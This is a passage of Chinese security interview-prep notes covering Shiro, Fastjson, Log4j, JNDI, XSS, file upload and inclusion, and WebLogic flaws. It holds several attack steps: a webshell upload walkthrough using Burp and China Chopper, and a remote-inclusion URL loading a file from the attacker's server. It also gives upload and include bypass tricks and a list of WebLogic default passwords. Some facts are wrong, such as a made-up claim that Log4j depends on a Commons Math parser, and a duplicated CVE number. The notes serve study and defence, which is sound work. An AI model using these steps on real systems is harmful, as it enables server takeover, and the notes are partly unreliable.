解密（加密密钥硬编码）</p><p>进行反序列化操作（未作过滤处理）</p></blockquote><p>在调用反序列化的时候未进行任何过滤，导致可以触发远程代码执行漏洞</p><p>用户登陆成功后会生成经过加密并编码的  cookie，在服务端接收 cookie 值后，Base64 解码 –&gt;AES 解密 –&gt; 反序列化。攻击者只要找到 AES  加密的密钥，就可以构造一个恶意对象，对其进行序列化 –&gt;AES 加密 –&gt;Base64 编码，然后将其作为 cookie 的  rememberMe 字段发送，Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p><h4 id="shiro550和721的区别"><a href="#shiro550和721的区别" class="headerlink" title="shiro550和721的区别"></a><strong>shiro550和721的区别</strong></h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731171017047.png" alt="image-20230731171017047"></p><h3 id="一、Fastjson-漏洞"><a href="#一、Fastjson-漏洞" class="headerlink" title="一、Fastjson 漏洞"></a>一、Fastjson 漏洞</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h4><p>在请求包里面中发送恶意的 json 格式 payload，漏洞在处理 json 对象的时候，没有对 @type 字段进行过滤，从而导致攻击者可以传入恶意的  TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java  实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数。</p><p>FastJson 是一个由阿里巴巴研发的 java 库，可以把 java 对象转换为 JSON 格式，也可以把 JSON 字符串转换为对象。</p><p>通俗理解就是：漏洞利用 fastjson autotype 在处理 json 对象的时候，未对 @type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。</p><p>攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。</p><p>Fastjson RCE 的本质就是在反序列化时会调用目标类的 setter 方法。以 com.sun.rowset.JdbcRowSetImpl Gadget 为例，类中的 setAutoCommit 方法中通过 connect 方法调用了 lookup 方法，且 lookup 方法的参数又能通过  setDataSourceName 方法设置，即其参数可控。那么就会导致 JNDI 注入，最终实现任意命令执行。</p><p>Java 处理 Json 格式数据有三个比较流行的类库：</p><ul><li>Gson (google 维护) </li><li>Jackson</li><li>Fastjson</li></ul><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170624443.png" alt="image-20230731170624443"></p><h3 id="二、log4j"><a href="#二、log4j" class="headerlink" title="二、log4j"></a>二、log4j</h3><p><strong>payload关键字：jndi</strong></p><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a><strong>原理：</strong></h4><p>Apache Log4j2 是一个基于 Java 的日志记录工具。Apache Log4j 2.x &lt;= <strong>2.14.1</strong> 版本存在远程代码执行漏洞。  漏洞的主要原因是 log4j2  的<strong>接收器对于不可靠来源的输入没有过滤</strong>，攻击者则可以利用此特性通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。由于 Log4j2  组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向服务器发送恶意的数据，触发 log4j2  组件的缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p><p>为了输出日志时能够方便地输出任意位置的 java 对象，Log4j2 引入了一个叫 <strong>Lookup  的统一接口</strong>。这个接口<strong>允许</strong>在写日志的时候，按照<strong>具体的实现逻辑</strong>去查找对象的位置，并输出对象的内容。这里的对象通常在内存中，但由于 java  支持对象的序列化 / 反序列化，它也可以存储在硬盘文件里，甚至是远程服务器上。</p><p>我们提到的 <strong>JNDI 就是对 Lookup  接口的一种实现</strong>。其本身也是一个接口，提供了命名关键字到对象的<strong>映射目录</strong>，允许开发者提供一个名称，即可获取到对象的内容。LDAP，即<strong>轻量级目录访问协议</strong>，是 JNDI 的一种底层实现，它可以让我们方便的<strong>查询分布式数据库</strong>。既然是分布式的，LDAP  <strong>允许从远程服务器加载对象</strong>。而这里加载对象时使用的不是一般的<strong>反序列化方法</strong>，而是通过<strong>「命名引用」功能</strong>，<strong>支持直接从远程下载 class  文件并加载对象</strong>。</p><p>于是，Log4j2 中就暗含了注入漏洞：<strong>允许传入参数解析为 LDAP 协议，从远程服务器下载 class 文件并执行</strong>。这个功能本来是为了方便开发，使 java 对象位置对上层应用透明，却不料酿成大祸</p><p>Log4j依赖于Apache Commons Math库中的一个子模块，即Math Expression Parser（MEP）库，以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，<strong>JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用</strong>。</p><p>攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。</p><p>攻击者可以利用此漏洞来执行各种攻击，包括但不限于：</p><ol><li>远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。</li><li>远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。</li></ol><h4 id="设备上出现log4j，怎么判断攻击成功？"><a href="#设备上出现log4j，怎么判断攻击成功？" class="headerlink" title="设备上出现log4j，怎么判断攻击成功？"></a><strong>设备上出现log4j，怎么判断攻击成功？</strong></h4><p>如果在设备上出现了log4j，则说明攻击者可能利用Log4j漏洞进行攻击，此时可以通过以下方式判断是否真的发生了攻击：</p><ol><li>检查服务器日志：如果攻击成功，一般会在服务器日志中留下明显的痕迹，如未经授权的文件访问、操作系统命令执行等。建议定期检查服务器日志，尤其是涉及敏感数据和关键操作的日志。</li><li>检查网络流量：攻击者在远程操纵受害设备时，一般需要与设备进行网络通信，因此可以通过检查网络流量来判断<strong>是否有异常的数据传输行为</strong>。建议采用<strong>网络监控工具</strong>对网络流量进行实时监控，并对异常流量进行警报和记录。</li><li>检查系统进程：攻击者在利用漏洞进行攻击时，可能需要启动或修改一些系统进程，因此可以通过检查系统进程列表来寻找<strong>异常行为</strong>。建议使用系统<strong>监控工具</strong>对系统进程进行实时监控，并对异常进程进行警报和记录。</li></ol><p>需要注意的是，出现了Log4j并不意味着攻击一定已经成功，也可能只是正常业务应用中使用了Log4j功能。因此，在判断是否受到攻击时，应该综合考虑多种因素，并采取相应的安全措施。</p><h2 id="三、JNDI-注入"><a href="#三、JNDI-注入" class="headerlink" title="三、JNDI 注入"></a>三、JNDI 注入</h2><p>JNDI RCE 漏洞产生的原因就在于当我们在注册 RMI 服务时，可以指定 Codebase url，也就是远程要加载类的位置，设 置该属性可以让 JDNI 应用程序在加载时去寻找我们指定的类 ( 例如：<a href="http://ip:port/EvilObject.class">http://ip:port/EvilObject.class</a>) 。 </p><p>这里还有一个比较重要的点，也是触发恶意代码的点。就是当 JNDI 应用程序通过 lookup (RMI 服务的地址) 方法调用指 定 Codebase url  上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时， 漏洞就会触发。</p><h2 id="一、CSRF漏洞"><a href="#一、CSRF漏洞" class="headerlink" title="一、CSRF漏洞"></a>一、<strong>CSRF</strong>漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110425758.png" alt="image-20230802110425758"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110531643.png" alt="image-20230802110531643"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110837789.png" alt="image-20230802110837789"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802111014210.png" alt="image-20230802111014210"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802111259860.png" alt="image-20230802111259860"></p><p>php中有<strong>CSP</strong>，java应该应该也有类似的，开启后没法进行外站应用</p><h2 id="一、XSS漏洞"><a href="#一、XSS漏洞" class="headerlink" title="一、XSS漏洞"></a>一、XSS漏洞</h2><h3 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h3><p>XSS 主要使用 javascript，javascript 可以非常灵活的操作 html、css 和浏览器。 </p><p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p><p>当用户访问被 XSS 注入的网页，XSS 代码就会被提取出来 用户浏览器就会解析这段 XSS 代码，也就是说用户被攻击了  用户最简单的动作就是使用浏览器上网，并且浏览器中有 javascript 解释器， 可以解析  javascript，然而浏览器不会判断代码是否恶意。</p><p>微博、留言板、聊天室等等<strong>收集用户输入的地方</strong>， 都有遭受 XSS 的风险，只要没有对用户的输入进行严格过滤，就会被 XSS 。</p><p>XSS的种类有哪些,区别和修复方式：</p><p>种类：存储型，反射型，DOM型<br>区别：存储型:常出现在信息修改添加等地方，导致恶意代码被存储在数据库中，每当被攻击者访问到后就会触发执行；反射型：常出现在url中，一般需要攻击者提前构造好恶意链接，欺骗用户点击，触发攻击代码；DOM型：攻击代码在url中，然后输出在了浏览器的DOM节点中。简单比较会发现，存储和反射都经过服务器，而DOM是纯前端。修复：对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only，装WAF等。</p><h3 id="XSS-漏洞危害"><a href="#XSS-漏洞危害" class="headerlink" title="XSS 漏洞危害"></a><strong>XSS 漏洞危害</strong></h3><ul><li>盗取各种用户账号 </li><li>窃取用户 Cookie 资料，冒充用户身份进入网站 </li><li>劫持用户会话，执行任意操作 </li><li>刷流量，执行弹窗广告 </li><li>传播蠕虫病毒</li></ul><h3 id="XSS-漏洞类型"><a href="#XSS-漏洞类型" class="headerlink" title="XSS 漏洞类型"></a><strong>XSS 漏洞类型</strong></h3><ul><li><p>反射型 XSS</p><p>搜索框，用户登录 </p><p>非持久性、参数跨站脚本 </p><p>窃取用户 cookie 或进行钓鱼欺骗</p></li><li><p>存储型 XSS</p><p>留言板，评论，博客日志 </p><p>持久性跨站脚本，更具威胁性 </p><p>渗透网站、挂马、蠕虫病毒、钓鱼</p></li><li><p>DOM 型 XSS</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> str <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>str<span class="token operator">+</span><span class="token string">"'&gt;testLink&lt;/a&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>write<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h2><h3 id="文件上传和命令执行，有看过相关日志吗？"><a href="#文件上传和命令执行，有看过相关日志吗？" class="headerlink" title="文件上传和命令执行，有看过相关日志吗？"></a><strong>文件上传和命令执行，有看过相关日志吗？</strong></h3><p>文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。</p><p>对于文件上传漏洞，以下是一些可能存在的相关日志：</p><ol><li>文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息，例如上传时间、上传文件名称、上传文件大小等。</li><li>访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传时间、上传 IP 地址等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。</li></ol><p>对于命令执行漏洞，以下是一些可能存在的相关日志：</p><ol><li>访问日志：Web 服务器或应用服务器上的访问日志中可能包含恶意代码执行的信息，例如请求 URL、HTTP 请求方法、HTTP 状态码等。</li><li>异常日志：应用程序中的异常日志可以记录可能存在的恶意代码执行异常信息，例如异常类型、异常堆栈等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录恶意代码执行的详细信息，例如恶意代码的来源、执行时间、执行结果等。</li></ol><p>需要注意的是，以上只是其中一部分可能存在的相关日志，实际应用中还有更多可能的日志类型。在进行文件上传和命令执行漏洞的检测和防御时，需要根据具体应用进行评估和选择，并及时发现和修复潜在的安全威胁。</p><h3 id="你能说明文件上传的原理吗？"><a href="#你能说明文件上传的原理吗？" class="headerlink" title="你能说明文件上传的原理吗？"></a><strong>你能说明文件上传的原理吗？</strong></h3><p>当用户上传文件时，通常需要通过 HTTP 或 HTTPS 协议将文件传输到 Web 服务器。文件上传的原理可以简单地描述为：</p><ol><li>客户端向服务器发送一个包含文件数据的 POST 请求。</li><li>服务器接收请求并解析其中的文件数据。</li><li>服务器将文件保存在指定的目录下，并返回处理结果给客户端。</li></ol><p>具体来说，文件上传流程一般如下：</p><ol><li>用户在 Web 页面上选择要上传的文件，并提交表单。</li><li>浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。</li><li>Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。</li><li>服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。</li><li>如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。</li><li>服务器返回上传结果给客户端，告知用户文件是否上传成功。</li></ol><p>需要注意的是，文件上传涉及到的安全问题较多，例如上传的文件可能会包含病毒、木马等恶意程序，攻击者可能会利用上传漏洞上传恶意文件，从而导致服务器被控制。因此，在进行文件上传功能开发时，需要仔细考虑安全问题，并采取相应的防御措施，例如限制上传文件大小、过滤不安全的文件类型等。</p><hr><h3 id="文件上传攻击特征？"><a href="#文件上传攻击特征？" class="headerlink" title="文件上传攻击特征？"></a><strong>文件上传攻击特征？</strong></h3><p>文件上传攻击是指攻击者通过网站上的文件上传功能，上传恶意文件来执行攻击。以下是一些文件上传攻击的特征：</p><ol><li>文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。</li><li>文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。</li><li>文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。</li><li>大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。</li><li>目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。</li></ol><p>如果您担心自己的网站可能会受到文件上传攻击，请确保实施足够的安全措施，如限制上传文件类型、大小和数量、对上传的文件进行检查、将上传的文件保存在安全的位置，并为所有上传的文件生成一个唯一的文件名。</p><h3 id="文件上传加固方法？"><a href="#文件上传加固方法？" class="headerlink" title="文件上传加固方法？"></a><strong>文件上传加固方法？</strong></h3><p>以下是保护您的网站免受文件上传攻击的一些方法：</p><ol><li>文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。</li><li>检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。</li><li>重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。</li><li>存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。</li><li>使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。</li><li>HTTPS加密：在传输过程中使用HTTPS协议加密，以避免数据在传输过程中被窃听或篡改。</li><li>日志审计：记录所有的文件上传操作并定期审计日志，以便发现异常上传行为，及时采取措施。</li></ol><p>总之，防止文件上传攻击需要综合考虑多种因素，包括文件类型、大小、内容、存储位置、传输方式等，同时定期进行安全审计，并且对于应用程序代码的编写需要充分考虑安全因素。</p><h3 id="文件上传绕过方式："><a href="#文件上传绕过方式：" class="headerlink" title="文件上传绕过方式："></a><strong>文件上传绕过方式：</strong></h3><p>1- 前端JS突破：抓包修改文件名 或者 禁用当前浏览器的JS脚本</p><p>​2- 后端突破：</p><p>​2.1-黑名单：方法太多了 点、空格点、 php 1234567 、phphtml、分布式文件上传、文件流绕过….</p><p>​2.2-白名单：比较鸡肋的00截断、双文件名…</p><p>​             内存木⻢已经注入，如何查杀？</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731174417138.png" alt="image-20230731174417138"></p><h2 id="二、文件包含"><a href="#二、文件包含" class="headerlink" title="二、文件包含"></a>二、文件包含</h2><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函 数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件 包含。服务器执行 PHP 文件时，可以通过包含函数加载另一个文件中的  PHP 代码， 并且当 PHP 来执行，这会为开发者节省大量的时间。</p><h3 id="产生漏洞的原因"><a href="#产生漏洞的原因" class="headerlink" title="产生漏洞的原因"></a><strong>产生漏洞的原因</strong></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    $var = $GET['page'];    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这是一段 PHP 代码，从代码上分析可以看出， 把一个 GET 请求的参数 “page” 传给了一个变 量  filename，然后包含了这个变量。然而，开发者没有对 $_GET [‘page’] 参数经过严格的过滤。直接带入了 include  的函数，我们可以修改 $_GET [‘page’] 的值，包含自己想看的文件。 （文件的路径一定要对，不对的话就包含不了）</p><p>这样，我们总结一下，<strong>文件包含漏洞就是</strong>： 程序开发人员一般希望代码更灵活，所以将被<strong>包含的文件设置为变  量</strong>，用来进行<strong>动态调用</strong>，文件<strong>包含函数加载的参数</strong>没有经过<strong>过滤</strong>或者严格的<strong>定义</strong>，可以被用户控制，包含其他恶意  文件，导致了执行了<strong>非预期的代码</strong>。从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><h3 id="包含函数有那些"><a href="#包含函数有那些" class="headerlink" title="包含函数有那些"></a><strong>包含函数<em>有那些</em></strong></h3><p>PHP 中文件包含函数有以下四种：</p><ul><li><p>require () 只要程序一运行就包含文件，找不到被包含的文件时会产生致命 错误，并停止脚本</p></li><li><p>require_once ()  若文件中代码已被包含则不会再次包含</p></li><li><p>include () 执行到 include 时才包含文件，找不到被包含文件时只会产生警告， 脚本将继续执行</p></li><li><p>include_once () 若文件中代码已被包含则不会再次包含</p><h3 id="文件包含漏洞利用条件"><a href="#文件包含漏洞利用条件" class="headerlink" title="文件包含漏洞利用条件"></a><strong>文件包含漏洞利用条件</strong></h3><ul><li>程序用 include () 等文件包含函数通过动态变量的范式引入需要包含的文件 </li><li>用户能够控制该动态变量 </li><li>要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</li></ul></li></ul><h3 id="文件包含漏洞的分类"><a href="#文件包含漏洞的分类" class="headerlink" title="文件包含漏洞的分类"></a><strong>文件包含漏洞的分类</strong></h3><ul><li><p>本地包含</p><p>可以包含本地文件，在条件允许时甚至能执行代码 读敏感文件，读 PHP 文件包含日志文件 GetShell 包含 data: 或 php://input 等伪协议 若有 phpinfo 则可以包含临时文件 配合上传图片马，然后包含从而 GetShell</p></li><li><p>远程包含</p><p>包含远程的木马或病毒文件，从而 GetShell</p></li></ul><p>注意：要实现远程文件包含需要 allow_url_fopen 和 allow_url_include 都开启</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    $var = $GET['page'];    include($var . ".html");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在包含变量 $var 时，限制了只允许包含 “.html”  格式的文件，这就阻止了一些非法的包含其他文件的情况。</p><h3 id="文件包含绕过限制-："><a href="#文件包含绕过限制-：" class="headerlink" title="文件包含绕过限制  ："></a><strong>文件包含绕过限制  ：</strong></h3><p>绕过后面的 “. Html” 限制有很多方法可以实现</p><ol><li><p>%00 截断</p><p>就是在 url 后面输入 %00</p><p>条件： allow_url_fopen = Off php 版本 &lt; 5.3.4</p></li><li><p>长路径截断 </p><p>条件：windows OS，点号需要长于 256；linux OS 长于 4096 windows 下目录最大长度为 256 字节，超出的部分会被丢 弃 linux 下目录最大长度为 4096 字节</p></li><li><p>点点点点点号绕过</p><p>点号绕过的原理和长路径截断的一样： 原理是： windows 下目录最大长度为 256 字节， 超出的部分会被丢弃 linux 下目录最大长度为 4096 字节，  超出的部分会被丢弃 所以用….. 绕过的时候 windows 系统 中，点号需要长于 256 ；linux 系统 中点号要长于 4096</p><h3 id="开启包含功能的条件-："><a href="#开启包含功能的条件-：" class="headerlink" title="开启包含功能的条件   ："></a><strong>开启包含功能的条件   ：</strong></h3><p>想要开启文件包含的 功能， 首先要修改 PHP 的配置 文件（PHP.ini）把文件里的功能选项开启。</p><p>在 Linux 中 PHP.ini 配置文件一般默认安装 在 /etc 目 录 下 。 下面是 两 个 功 能选项 ： </p><ul><li><p>allow_url_fopen ：</p><p>on 默认 开 启 该选项 为 on 便 是 激活了 URL 形式 的 fopen 封装协议使得可以访问 URL 对 象文件等。</p></li><li><p>allow_url_include ：</p><p>off 默认关闭，该选项 为 on 便 是允许 包含 URL 对 象文件等自己有没有实操过文件上传配合文件包含漏洞？</p></li></ul></li></ol><h3 id="自己有没有实操过文件上传配合文件包含漏洞？"><a href="#自己有没有实操过文件上传配合文件包含漏洞？" class="headerlink" title="自己有没有实操过文件上传配合文件包含漏洞？"></a><strong>自己有没有实操过文件上传配合文件包含漏洞？</strong></h3><p>发现一个上传文件页面，但只能上传图片。</p><p>我们可以利用火狐来绕过限制，首先设置浏览器的代理为 127.0.0.1 端口为 8080，然后打开 burp suite 工具待用 ，然后再次上传我们的木马文件，这时候 burp suite  工具会闪烁， 我们进入 burp suite ，发现找到了我们 刚刚发送的数据包，接下来我们需要修改一下文件格式这一选项， 把它的格式改为  image/jpeg，我们这么做的目的为了是欺骗一下服务器端的验证，让它以为是这是一个图片格式 的文件。我们点击一下 Forward ,  把它放过 然后切换到浏览器，我们发现文件上传成功了。</p><p>我们先把 BP 给关掉，然后再用文件包含的方式对上传上去的文件进行访问，查看文件是否真的上传成功文件上传成功！ 接下来我们使用中国菜刀连接一下我们的木马文件。</p><p>打开我们的中国菜刀，在地址栏中填上我们木马文件上传到的路径， 这里采用文件包含的形式 <a href="http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php">http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php</a> 密码为 f</p><p>脚本类型改为 PHP，点击添加之后，双击我们的链接进入 成功获取了 shell！！！</p><h3 id="远程文件包含是什么？"><a href="#远程文件包含是什么？" class="headerlink" title="远程文件包含是什么？"></a><strong>远程文件包含是什么？</strong></h3><p>远程文件包含本质上和 LFI (本地文件包含) 是同一个概 念，只是被包含的 “文件源” 不是从本次磁盘上获得，而 是从外部输入流得到。 如果 PHP 的配置选项  allow_url_include 为 ON 的话， 则 include/require 函数可以加载远程文件，这种漏洞被称为  “远程文件包含漏洞 (Remote File Inclusion RFI)”。</p><p>注意：如果是包含远程服务器上的 PHP 文件，那么得到的是被远程服务器解析过的 PHP，所以在写一句话木马的 时候就不要做成 .php 的文件 ，一般做成 .txt 的文件，再让它包含过来。</p><p>我们用 windows server 2003 服务器包含一个 Linux 上 的 phpinfo.php 文件，那么得到的就是 Linux 的 php 配置文件 ，而不是 Windows 上的 php 配置信息。</p><p>我们已知 192.168.173.128 这台服务器中存在着文件包含漏洞，我们想要通过远程包含自己的服务器上的木马文件，首先，我们在自己的服务器  192.168.173.129 上新建一 个文件 2.txt。我们通过远程包含文件包含到 192.168.173.128 这台目标 服务器上，  包含的方式与本地包含的方式类似： <a href="http://192.168.173.128/index.php?page=http://192">http://192.168.173.128/index.php?page=http://192</a>. 168.173.129/2.txt。然后我们访问，若看到页面显示正常，说明文件包含成功。</p><h2 id="二、weblogic原理"><a href="#二、weblogic原理" class="headerlink" title="二、weblogic原理"></a>二、weblogic原理</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173434963.png" alt="image-20230731173434963"></p><h3 id="WebLogic-权限绕过的姿势？"><a href="#WebLogic-权限绕过的姿势？" class="headerlink" title="WebLogic 权限绕过的姿势？"></a><strong>WebLogic 权限绕过的姿势？</strong></h3><p><code>CVE-2020-14883</code> 是一个 <code>Console</code> 的未授权访问，而 <code>CVE-2020-14883</code> 是在利用未授权访问的前提下，在 <code>Console</code> 进行代码执行，于是远程攻击者可以构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p><p>1、 通过静态资源来绕过权限验证，防止被重定向到登陆界面。</p><p>2、 通过请求 <code>.portal</code> ，控制处理的 <code>Servlet</code> 是渲染 <code>UI</code> 的 <code>MBeanUtilsInitSingleFileServlet</code> 。</p><p>3、 通过编码后的 <code>../</code> ，让最终渲染的模版是 <code>console.portal</code> 。</p><p>综合起来，才造成了最终的未授权访问。</p><h3 id="Weblogic-漏洞扫描工具"><a href="#Weblogic-漏洞扫描工具" class="headerlink" title="Weblogic 漏洞扫描工具"></a><strong>Weblogic 漏洞扫描工具</strong></h3><p>安装工具：</p><ol><li><p>安装依赖 python &gt;= 3.6 <code>pip3 install requests</code></p></li><li><p>下载 weblogicScanner</p><p><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p></li><li><p>进入 weblogicScanner</p></li><li><p>举例：测试本机是否存在漏洞 `python ws.py -t 127.0.0.1</p></li></ol><h3 id="WebLogic-常用弱口令："><a href="#WebLogic-常用弱口令：" class="headerlink" title="WebLogic 常用弱口令："></a><strong>WebLogic 常用弱口令</strong>：</h3><pre class="line-numbers language-none"><code class="language-none">weblogic Oracl@123weblogic weblogicguest guestportaladmin portaladminadmin securityjoe passwordmary passwordsystem securitywlcsystem wlcsystemwlcsystem sipisystemsystem password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="weblogic漏洞"><a href="#weblogic漏洞" class="headerlink" title="weblogic漏洞"></a><strong>weblogic漏洞</strong></h3><pre class="line-numbers language-none"><code class="language-none">Weblogic 反序列化漏洞 CVE-2021-2394Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109Weblogic RCE CVE-2020-14882&amp;14883weblogic jndi注入CVE-2020-14841Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645WebLogic CVE-2020-14756 T3IIOP反序列化RCEWeblogic 远程代码执行漏洞 CVE-2020-2883Weblogic CVE-2020-2551 IIOP协议反序列化rceWeblogic反序列化漏洞 CVE-2019-2890Weblogic反序列化远程代码执行漏洞CVE-2019-2725Weblogic反序列化漏洞 CVE-2019-2729Weblogic任意文件读取漏洞（CVE-2019-2615)）Weblogic 文件上传漏洞（CVE-2019-2618）weblogic 反序列化漏洞 CVE-2018-3252Weblogic反序列化远程代码执行漏洞 CVE-2018-3245Weblogic远程代码执行漏洞 CVE-2018-3191Weblogic任意文件上传漏洞（CVE-2018-2894）Weblogic 